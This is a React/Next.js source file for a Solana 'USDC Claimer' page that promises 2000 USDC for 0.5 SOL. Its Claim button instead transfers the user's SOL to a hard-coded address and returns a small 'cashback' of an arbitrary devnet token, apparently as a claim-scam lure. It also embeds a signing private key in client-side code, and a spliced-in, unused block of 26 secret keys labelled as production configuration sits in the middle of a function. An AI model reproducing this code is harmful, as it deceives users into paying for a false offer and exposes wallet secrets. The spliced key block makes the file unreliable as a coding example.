/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "2dyusFSZekEqnf4Sd6uc43HoEfEdkvajYCPPwfdAa3hQtA5TCsTeqqVLo1htfzcNPYe7Uez48hiHLD5EGYW2f8wt"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "2QSXBaffLJ3VpZbWuc71E82794X34ZjcPwMhWQyV85hHKjpZxX29datastYAvxjzBZAEdnuoEf31rU5yPUzVMMpW",
  "key1": "41LvuLYw5gNLdsbv4Bm1vBvokoZVd3rC4ZehZrzcRrPJKnkRxjU1dDmYES9QwPjXGCD97H2JwNiBVQiP5BiaqTn8",
  "key2": "5c3PjTCwHvBxiq4CMxhH76PZeAwUa2PCxnGkiG3pKCEMnnyGaVX35sxG9XWPEh792pTfyCbHrkJv2KdTDJjhu5Xt",
  "key3": "4Arqt7ToidA3FarN8pKhEUBtHJQcrKw1UTdczDHDVmmsuVWbhzFuMSiriCDaiuwSvQsFzzp2R2vjC5JLYpnYudEm",
  "key4": "3i6oUAV2AjqRPKBubxcqhuSQ3f8PT9XTpPDx1zGwRuGavg1tNHzEeFgHi1B8WASvVUeTXrg26ysxs7hjohgSR84n",
  "key5": "4ZuG6CLgkNBDaFDa5FXmpnwYhGKyKPayWmPMmjJG6RuGnZo2r2tLGd9vmYZh6Rxqyb8dZW36XUxVVHu1w3aNkynm",
  "key6": "W7Q1n41zNj4NMgFUbxNRK9wS75TejgwbWhtt2WD5Ambobw5qAZJuc7XyRWLTorGFGiExJXF4RrTwPNmTocQA9zr",
  "key7": "2FmNp6GffEj9awd9uA4Xwj8rrCgSLADhVBGuG8mciwZBbRascJjxPBYLU5Ckn7zBXZAMAEa4cgEafL5zkBH5DgpZ",
  "key8": "2MLvj9R3GmX8uQ3Ppch1mGDaFEdHPB4QQCcz4zrzW1pW7QbhXUaPDvv2XAZoVHerfP1mmxFawFxt38uUDkbMv6Yb",
  "key9": "Py6ZbUE5hppDceoqk2CCiZRHz33hfn7s4sq1nU4SPuYhRpJjfiLJZ3p9Sdd4CW7ccT6Ynhv8HxVFEACgcfM63cA",
  "key10": "62b3mzdjRCXKW7SDutHSR7dFWLWJV7iuc8qDDcbd3YGavFKud4P5D1GCG2YRsWrEnGpUtTejgYGiWwKG4pm8w7TP",
  "key11": "5zPLZtwPX7HyJFx5gb12D8eSZYiueVSBkbgEZEEyKSisfnN4PwVkHEcreqi1h8zyZKKVAcyGCswqdn3LLpQHLuvG",
  "key12": "4Mxd7EPN8ZudwZTQ8GmPjMTmBorgndVLJUnfyhjrCh4XspoTj3LF2kbySjWWbrep8t9DKrf1bk2uqLsYu9WurRaU",
  "key13": "3aGWrpuDQQFBxe95zLYVA9zLpDJfuZP4g6AqeBYZst79WSuFUa1q3HRJz5H1N38Y45hCGqn2AYzpLvtvcPCswRfw",
  "key14": "2gAihnBNHakvy6jYikQy6gkCa9kxxeMWfEvqAbzwdQtvmPpMXgJnHfXiR2Zx75ePJyfgikRFNf1kXkdVpyCbVyXA",
  "key15": "5E2Zp6d3gAPP1QMHq8Qy5EL1ijHeERhVES2UZ9SatMnwtrxwaikWHVGF9V11KQnW8FqMSy2afUdV38yUdzir6det",
  "key16": "629HSdZJ2N8zEypL8ym49GGrD8qbyiAegLAF95XchJSeB4Uj2euUJWbBk6ktNvsNaJ5ewTb85tDyUxMVzejHQko7",
  "key17": "4LS6JjmvdSkHCCKUjEHFD4jHJ8anrkMNbqwLRWGeztmSmJKwghGxFM2WFkqGLQAKcBpkPtWn7Ho733L9weCbrCuX",
  "key18": "iw2LVu8bkr1CcMCZX3GvQsjtZTNg4Y5wkqMuhto5dBxLHRnzaHxzAkFfShmh8U1V5Wt5z3JZ9ueaMssXiHNgxg9",
  "key19": "65J21tf6zGa2W4Bkp7KqpMJkzzTe3Hbtsc5wYywyXsNoX21tiLYkbrx5Xhrxjd968xCEqqFBhWmDvMQFDaMWp6LE",
  "key20": "2KW9iSDU4cWxpFNUXcBWsUptzvygJ5kjdaUdjJTTiCe8B6KTGAji5a2VK7Qnvmy6nR2bH6UegLV7zdv1G4Gv7QGj",
  "key21": "44oeHJ74N9hkVcWaMHpVwwtKBt4toea9x5qF8F4FCjP1NAmHQAjvfVjdir5SN6J5B7fz3hcmycS5Ksj8oNNySGhc",
  "key22": "21oNZXTo72W9UcQp2b2hwzxZUkJZrUHqCxThJ7p2rxBwbAaNC5GLFPX5484R9PuMzwgE7UdrGd6jWxfJDfu8wFRh",
  "key23": "JxoUsdNedR2sCRoQRnCK9wWswDz6wFfhoueKKuscKsSibbirsh4geDxYVAuEfJrvFw3mFD67tWMvzVzy8pEwegd",
  "key24": "oQ6Gm63F9g7X4QUFr5zZaoNRUJN3enSX4NThefABw71vwUXroQKGpHQYVFGD2fxFVJRYQNXZ2JCgkbgUg6r6Yj3",
  "key25": "4Qp1AV88vKssh2vM6Rvg869yay8HYn49WfeyByv6YJ6byK4gQew2AcrskvEFpkmPcccZmo8yQNd4ex6hj1QroMMg"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
